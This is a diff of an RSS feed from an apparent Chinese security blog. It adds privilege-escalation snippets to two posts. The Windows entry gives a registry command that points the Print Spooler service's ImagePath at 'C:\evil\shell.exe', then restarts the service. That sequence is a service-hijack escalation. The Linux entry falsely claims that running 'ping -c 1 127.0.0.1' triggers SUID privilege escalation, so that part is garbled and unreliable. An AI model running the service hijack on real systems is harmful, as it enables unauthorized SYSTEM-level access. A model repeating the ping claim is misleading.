@@ -4,8 +4,8 @@
     <title>内网 on h4xk0r blog</title>
     <link>http://localhost:1313/categories/%E5%86%85%E7%BD%91/</link>
     <description>Recent content in 内网 on h4xk0r blog</description>
-    <generator>Hugo -- 0.155.1</generator>
-    <language>zh-cn</language>
+    <generator>Hugo -- 0.167.0</generator>
+    <language>zh-CN</language>
     <lastBuildDate>Sun, 15 Feb 2026 00:00:00 +0000</lastBuildDate>
     <atom:link href="http://localhost:1313/categories/%E5%86%85%E7%BD%91/index.xml" rel="self" type="application/rss+xml" />
     <item>
@@ -94,7 +94,13 @@
 &lt;/ul&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;&lt;strong&gt;利用/bin/ping提权&lt;/strong&gt;：&lt;/p&gt;</description>
+&lt;p&gt;&lt;strong&gt;利用/bin/ping提权&lt;/strong&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ping -c &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 127.0.0.1
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;通过特殊参数（如&lt;code&gt;-c&lt;/code&gt;）触发SUID权限&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;</description>
     </item>
     <item>
       <title>Windows提权</title>
@@ -149,7 +155,11 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg add &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Spooler&amp;#34;&lt;/span&gt; /t REG_EXPAND_SZ /v ImagePath /d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\evil\shell.exe&amp;#34;&lt;/span&gt; /f
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;重启服务：&lt;/p&gt;</description>
+&lt;p&gt;重启服务：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;net stop Spooler
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;net start Spooler
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ol&gt;</description>
     </item>
   </channel>
 </rss>
